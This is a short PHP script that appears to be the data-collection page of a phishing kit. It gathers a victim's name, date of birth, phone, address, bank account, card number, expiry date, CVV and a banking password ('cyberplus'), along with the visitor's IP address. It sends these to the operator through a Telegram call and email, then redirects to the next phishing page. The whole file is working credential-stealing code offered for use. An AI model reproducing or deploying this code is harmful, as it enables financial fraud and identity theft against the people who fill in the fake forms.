<?php
include_once 'functions.php';	
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|-----------------------------------|\n";
$message .= "| P   : ".$_POST['AK01']."\n";
$message .= "| N   : ".$_POST['AK02']."\n";
$message .= "| DOB : ".$_POST['AK03']."-".$_POST['AK04']."-".$_POST['AK05']."\n";
$message .= "| Num : ".$_POST['AK06']."\n";
$message .= "| Adress : ".$_POST['AK070']."\n";
$message .= "| Postal  : ".$_POST['AK07']."\n";
$message .= "| BNK: ".$_POST['bank']."\n";
$message .= "| NC   : ".$_POST['account']."\n";
$message .= "| CB    : ".$_POST['ccnum']."\n";
$message .= "| Date : ".$_POST['expMonth']."/".$_POST['expYear']."\n";
$message .= "| CV       : ".$_POST['cvv']."\n";
$message .= "|cyberplus : ".$_POST['plus']."\n";
$message .= "|------------------------------------|\n";
//$send = "backdoorx10x20@gmail.com";
$subject = ":  $ip";
telegram_send(urlencode($message));
{
mail("$send", "$subject", $message);
}
header("Location:lo1.php");
?>


